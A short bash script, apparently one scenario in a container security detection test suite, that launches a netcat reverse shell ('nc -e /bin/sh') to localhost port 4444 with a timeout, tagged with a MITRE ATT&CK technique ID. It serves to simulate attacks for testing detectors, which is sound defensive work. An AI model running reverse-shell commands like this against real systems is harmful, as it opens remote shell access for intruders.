#!/usr/bin/env bash
# S09 - netcat reverse shell from a container (T1059.004).
set -uo pipefail
source "$(dirname "$0")/_lib.sh"
vexec sh -c 'timeout 2 nc -e /bin/sh 127.0.0.1 4444' || true
